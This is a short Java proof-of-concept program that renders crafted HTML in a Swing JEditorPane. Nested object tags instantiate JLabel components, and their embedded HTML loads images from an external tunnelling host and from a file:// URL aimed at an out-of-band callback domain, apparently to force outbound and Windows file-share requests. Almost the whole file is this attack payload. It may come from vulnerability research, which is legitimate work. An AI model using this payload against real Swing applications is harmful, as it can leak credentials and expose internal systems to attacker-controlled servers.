import javax.swing.*;
public class SwingWindowsProof {
 public static void main(String[] args) throws Exception {
   System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
   String html="<html><body>"+
     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image'>"+
     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;https://ddlnp-54-196-15-50.run.pinggy-free.link/nested-image&quot;&gt;&lt;/html&gt;'></object>"+
     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;file://cwgmxyssmmssmczp--ijunc1786941240.oob.blackmail.zip/share/nonexistent&quot;&gt;&lt;/html&gt;'></object>"+
     "</body></html>";
   SwingUtilities.invokeAndWait(() -> {
     JEditorPane pane=new JEditorPane("text/html",html);
     JFrame frame=new JFrame("proof"); frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE); frame.add(pane); frame.setSize(500,500); frame.setVisible(true);
     System.out.println("Rendered frame: "+html);
   });
   Thread.sleep(30000);
   System.out.println("done"); System.exit(0);
 }
}
